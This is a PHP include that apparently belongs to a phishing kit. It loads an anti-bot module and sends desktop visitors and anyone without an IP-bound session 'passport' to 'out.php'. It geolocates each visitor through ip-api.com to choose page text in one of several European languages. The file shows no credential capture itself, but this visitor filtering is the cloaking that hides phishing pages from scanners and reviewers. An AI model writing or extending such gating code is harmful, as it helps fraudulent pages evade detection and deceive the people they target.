<?php 

@session_start();
@date_default_timezone_set("Europe/Berlin");
require (__DIR__).'/bots/father.php';
require (__DIR__)."/md.php";
require (__DIR__)."/config.php";


$detect = new Mobile_Detect;
if(!$detect->isMobile() and strtolower($block_pc)=="on"){
   exit(header("location: out.php"));
 }

 if(!isset($_SESSION['passport']) OR @$_SESSION['passport'] != $_SERVER['REMOTE_ADDR']){
  // EXIT IF VISITOR HAS NO SESSION
  header("location: out.php");
  exit;
}


function getIp(){
	$ip = $_SERVER['REMOTE_ADDR'];
	if(in_array($ip, array("::1", "0.0.0.0", "127.0.0.1"))){
		$ip = "104.37.32.0";
	}
	
	return $ip;
}

function getCountryCode($ip){
	$c = curl_init("http://ip-api.com/json/$ip?fields=countryCode");
	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	$res = curl_exec($c);
	curl_exec($c);
	$data = json_decode($res);
	return $data->countryCode;
}


$codes = array("DE","RO","FR","ES","EN","DK");

if(isset($_SESSION['countryCode'])){
	$countryCode = $_SESSION['countryCode'];
}else{
	$countryCode = getCountryCode(getIp());
}


if(!in_array($countryCode, $codes)){
	$local="EN";
}else{
	$_SESSION['countryCode'] = $countryCode;
	$local =  $countryCode;
}
 
 
$langs =  file_get_contents((__DIR__).'/lib/global.json');
$global = json_decode($langs, true);

function getLang($d){
	global $local;
	global $global;
	return $global[$local][$d];
}



?>